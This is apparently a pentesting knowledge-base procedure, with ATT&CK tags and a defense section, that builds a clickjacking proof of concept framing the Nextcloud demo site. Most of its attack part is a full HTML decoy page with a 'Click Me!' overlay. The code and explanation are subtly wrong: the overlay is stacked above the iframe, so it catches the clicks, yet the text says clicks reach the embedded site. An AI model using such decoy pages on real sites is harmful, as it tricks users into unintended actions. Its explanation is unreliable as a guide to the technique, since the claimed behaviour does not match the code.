---
id: proc-clickjacking-iframe
tags:
  - clickjacking
  - ui-redressing
  - iframe
  - nextcloud
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:05.150Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Demonstrate-Clickjacking-with-Iframe-Overlay

## Summary

This procedure creates a proof-of-concept HTML page that embeds the Nextcloud demo site in an iframe, exploiting the absence of X-Frame-Options or similar headers to overlay deceptive elements and hijack user clicks, potentially tricking users into performing actions like logging in or interacting with the interface.

## Description

Clickjacking, or UI redressing, involves embedding a target site in an invisible or overlaid iframe on an attacker-controlled page. In this case, the Nextcloud demo site at https://demo.nextcloud.com lacks proper frame-busting protections, allowing it to be iframed. An attacker can position transparent overlays over sensitive elements (e.g., buttons) to capture clicks, leading to unintended actions. While the demo site has low impact due to no sensitive data, this demonstrates the vulnerability in a production context where it could enable unauthorized interactions. Prerequisites include basic HTML knowledge and access to host or view the PoC locally.

## Requirements

1. Web browser (e.g., Chrome, Firefox) to test the PoC
2. Text editor (e.g., VS Code, Notepad) to create the HTML file
3. Internet access to load the target site in the iframe
4. Optional: Local web server to host the PoC for realism

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN header on all pages
- Use Content-Security-Policy (CSP) with frame-ancestors directive to restrict framing
- Monitor for unusual embedding attempts via web application firewall (WAF) rules
- Educate users on phishing risks and verify site authenticity

## Objectives

1. Embed the target site in an iframe without restrictions
2. Overlay elements to hijack clicks on demo interface components
3. Validate the vulnerability by confirming no frame-busting occurs

## Instructions

### Step 1: Create the HTML Proof-of-Concept File

**Context**: Build a basic HTML page with an iframe targeting the Nextcloud demo site and a visible overlay to simulate click hijacking.

Create `clickjack-poc.html` with the following content:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Demo</title>
    <style>
        body { margin: 0; padding: 0; }
        #target-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 800px;
            height: 600px;
            border: none;
            opacity: 0.5; /* Make semi-transparent for demo */
        }
        #overlay {
            position: absolute;
            top: 200px; /* Align with a button on the demo site */
            left: 300px;
            width: 100px;
            height: 40px;
            background-color: rgba(255, 0, 0, 0.8);
            color: white;
            text-align: center;
            line-height: 40px;
            z-index: 10;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Innocent Looking Page</h1>
    <p>Click the red button below to proceed!</p>
    <div id="overlay">Click Me!</div>
    <iframe id="target-frame" src="https://demo.nextcloud.com"></iframe>
</body>
</html>
```

> This code embeds the site at 800x600 pixels with a red overlay positioned to align with elements like the login button. The semi-transparent iframe allows visibility during testing.

### Step 2: Test the Clickjacking PoC

**Context**: Load the HTML file in a browser to verify embedding and click hijacking.

Open `clickjack-poc.html` in a web browser. Interact with the overlay; observe if clicks propagate to the underlying iframe (e.g., triggering a demo action). Check browser console for any framing errors.

> Successful execution shows the Nextcloud site loading without restrictions. Clicks on the overlay should perform actions on the embedded site, such as form submissions, confirming the vulnerability.

### Step 3: Validate and Document Impact

**Context**: Assess the potential for user deception and note limitations.

Position the overlay over specific demo elements (e.g., adjust top/left CSS for login or file upload buttons). Test on different browsers. Document that while demo has low impact, production sites could enable unauthorized logins or data interactions.

> Expected: No X-Frame-Options header blocks the iframe (verifiable via browser dev tools > Network tab).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[ui-redressing]]
- [[web-vulnerability]]
